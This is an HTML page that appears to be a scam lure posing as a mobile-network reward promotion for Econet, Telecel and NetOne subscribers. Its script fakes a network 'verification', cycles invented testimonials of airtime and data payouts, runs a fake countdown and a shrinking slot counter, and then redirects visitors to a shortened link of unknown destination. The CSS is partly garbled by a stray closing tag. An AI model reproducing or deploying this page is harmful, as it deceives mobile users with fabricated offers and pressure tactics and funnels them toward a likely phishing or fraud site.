<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Mobile network eligibility check and promotional offers.">
<title>Network Reward Check</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
}

body{
font-family:Arial,sans-serif;
background:linear-gradient(135deg,#1a3cff,#ffcc00);
min-height:100vh;
display:flex;
flex-direction:column;
justify-content:center;
align-items:center;
padding:20px;
animation:bgMove 8s infinite alternate;
}

@keyframes bgMove{
0%{background:linear-gradient(135deg,#1a3cff,#ffcc00);}
100%{background:linear-gradient(135deg,#ffcc00,#1a3cff);}
}

.header{
width:100%;
max-width:460px;
background:#000;
color:#ffcc00;
padding:18px;
text-align:center;
font-size:22px;
font-weight:bold;
border-radius:14px 14px 0 0;
}

.container{
background:#fff;
width:100%;
max-width:460px;
padding:30px 25px;
border-radius:0 0 14px 14px;
box-shadow:0 10px 30px rgba(0,0,0,0.25);
text-align:center;
}

h2{
font-size:24px;
</html>font-size:15px;
}

.timer{
font-weight:bold;
margin-bottom:15px;
color:#1a3cff;
}

.ticker{
background:#fff;
color:#000;
padding:12px;
font-size:14px;
font-weight:bold;
border-top:2px solid #1a3cff;
border-bottom:2px solid #1a3cff;
position:fixed;
bottom:0;
width:100%;
}

</style>

</head>

<body>

<div class="header">
Mobile Network Verification Promo
</div>

<div class="container" id="mainBox">

<div class="timer">
⏳ Offer expires in <span id="countdown">05:30:00</span>
</div>

<div class="slots">
⚡ Only <span id="slots">100</span> reward slots left today
</div>

<h2>Select the network you use</h2>

<p>Verify your number to unlock exclusive rewards instantly.</p>

<button class="Econet" onclick="verifyNetwork('Econet')">Econet</button>
<button class="Telecel" onclick="verifyNetwork('Telecel')">Telecel</button>
<button class="NetOne" onclick="verifyNetwork('NetOne')">NetOne</button>

<p class="notice">
Verification system scans network eligibility before showing rewards
</p>

</div>

<div class="ticker" id="testimonialTicker">
+263***4521 just received 10GB bonus
</div>

<script>

function verifyNetwork(network){

const box=document.getElementById("mainBox");

box.innerHTML=`
<h2>Verifying ${network} Network</h2>
<p id="stepText">Detecting network...</p>

<div class="progress">
<div class="bar" id="bar"></div>
</div>
`;

let progress=0;

const steps=[
"Detecting network...",
"Validating reward eligibility...",
"Checking remaining slots...",
"Preparing activation..."
];

let interval=setInterval(function(){

progress+=5;

document.getElementById("bar").style.width=progress+"%";

if(progress==25){
document.getElementById("stepText").innerText=steps[1];
}

if(progress==50){
document.getElementById("stepText").innerText=steps[2];
}

if(progress==75){
document.getElementById("stepText").innerText=steps[3];
}

if(progress>=100){

clearInterval(interval);

document.getElementById("stepText").innerText="Redirecting...";

setTimeout(function(){
window.location.href="https://ln.run/_hOth";
},1000)

}

},200)

}

const testimonies=[
"+263***4521 just received 10GB and $20 airtime",
"+263***9932 just received 5GB and $10 airtime",
"+263***7710 just received 10GB and $30 airtime",
"+263***6284 just received 2GB and $5 airtime",
"+263***3345 just received 5GB and $10 airtime",
"+263***9921 just received 10GB and $30 airtime"
]

setInterval(()=>{
const random=Math.floor(Math.random()*testimonies.length)
document.getElementById("testimonialTicker").innerText=testimonies[random]
},4000)

let slots=23

setInterval(()=>{
if(slots>7){
slots--
document.getElementById("slots").innerText=slots
}
},15000)

let time=19800

const timer=setInterval(()=>{
let h=Math.floor(time/3600)
let m=Math.floor((time%3600)/60)
let s=time%60

document.getElementById("countdown").innerText=
String(h).padStart(2,'0')+":"+
String(m).padStart(2,'0')+":"+
String(s).padStart(2,'0')

time--

if(time<=0){
clearInterval(timer)
}

},1000)

</script>

</body>
</html>
